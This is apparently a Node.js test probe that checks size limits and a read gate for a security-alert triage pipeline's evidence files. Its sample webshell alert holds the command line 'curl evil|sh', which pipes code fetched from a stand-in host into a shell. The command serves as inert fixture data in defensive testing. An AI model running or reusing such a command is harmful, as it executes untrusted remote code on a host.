// 黑盒探针：06-必查项.json 的两道闸（文档 triage-pipeline.md §6.2/:552-558、§6.4/:598）
// ① 落盘上界 64000 字符：超界项先降级成只留计数（slimmed_items），再放不下整项不写（omitted_items + truncated）
// ② readCaseFile 25000 字闸：≤25000 给内容，≥25001 只给错误；readRequiredEvidence 没有这道闸，读全文
// 只调公开 API（writeSyslogCase / writeRequiredEvidence / readCaseFile / readRequiredEvidence），不碰实现内容。
import { mkdir, readFile, writeFile, stat, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

const ROOT = new URL('../../../..', import.meta.url).pathname;
const sc = await import(path.join(ROOT, 'syslog-case.js'));
const { writeSyslogCase, writeRequiredEvidence, readCaseFile, readRequiredEvidence,
  requiredEvidenceMaxChars, requiredEvidenceFile } = sc;

const base = await mkdir(path.join(tmpdir(), 't040-probe-gate-' + process.pid), { recursive: true });
const parsed = { msgid: 'cloudwalker-webshell', ts: '2026-11-17T10:00:00Z', payload_format: 'keyvalue',
  payload: { host_ip: '10.0.0.5', source_ip: '1.2.3.4', event_create_time: '2026-11-17 18:00:00',
    event_name: 'webshell', process_command_line: 'curl evil|sh', file_path: '/tmp/a.php' } };
const makeCase = async name => {
  const info = await writeSyslogCase({ directory: path.join(base, name), raw: 'RAW', parsed,
    context: { occurrence_count: 1, delivery_count: 1, window: [], baseline: {}, intel: {}, history: [] },
    match: { matched: false }, wiki: null });
  return info;
};
const checks = (n, rowChars) => Array.from({ length: n }, (_, i) => ({
  id: `check-${i}`, label: `第 ${i} 项`, tool: 'list_host_events', scope: '同主机', status: 'records_returned',
  evidence_id: `cw:${i}`, returned_count: 8, total_reported: 12,
  first_rows: Array.from({ length: 5 }, (_, r) => ({ facts: { cmdline: { value: '字'.repeat(rowChars) + `-${i}-${r}`, pointer: `/events/${r}/cmdline` } } })) }));

// ② 25000 字闸的边界（同一份 ≤25000 的文件按字符数补齐到边界；中文多字节，按字符不按字节）
{
  const info = await makeCase('gate');
  await writeRequiredEvidence(info, { alertId: 'a:1', mode: 'triage', checks: checks(6, 200) });
  const file = path.join(info.case_dir, requiredEvidenceFile);
  const text = await readFile(file, 'utf8');
  console.log(`[闸] 原始 字符=${text.length} 字节=${(await stat(file)).size}`);
  for (const target of [24999, 25000, 25001]) {
    await writeFile(file, text + ' '.repeat(target - text.length));
    const got = await readCaseFile(info, requiredEvidenceFile);
    console.log(`[闸] ${target} 字符 -> ${got.error ? 'ERROR ' + got.error : 'CONTENT len=' + got.content.length}`);
  }
  await writeFile(file, text);
}

// ① 64000 上界：slim / omitted 两级
{
  const info = await makeCase('bound-small');
  const body = await writeRequiredEvidence(info, { alertId: 'a:1', mode: 'triage', checks: checks(30, 200) });
  const text = await readFile(path.join(info.case_dir, requiredEvidenceFile), 'utf8');
  console.log(`[上界] 30 项×5 行 200 字 -> 落盘 ${text.length} 字符（常量 ${requiredEvidenceMaxChars}），slimmed=${body.slimmed_items}, omitted=${body.omitted_items ?? 0}`);
  const { 0: gateRead } = [await readCaseFile(info, requiredEvidenceFile)];
  const back = await readRequiredEvidence(info);
  console.log(`[上界] 超 25000 的这份：readCaseFile=${gateRead.error ? 'ERROR' : 'CONTENT'}，readRequiredEvidence checks=${back?.checks?.length}`);

  const info2 = await makeCase('bound-huge');
  const N = 600;
  const body2 = await writeRequiredEvidence(info2, { alertId: 'a:1', mode: 'triage', checks: checks(N, 200) });
  const text2 = await readFile(path.join(info2.case_dir, requiredEvidenceFile), 'utf8');
  console.log(`[上界] ${N} 项 -> 落盘 ${text2.length} 字符（<=常量 ${text2.length <= requiredEvidenceMaxChars}）`
    + ` slimmed=${body2.slimmed_items} omitted=${body2.omitted_items} truncated=${body2.truncated}`
    + ` 守恒 checks+omitted=${body2.checks.length + (body2.omitted_items || 0)}/${N}`);
}
await rm(base, { recursive: true, force: true });
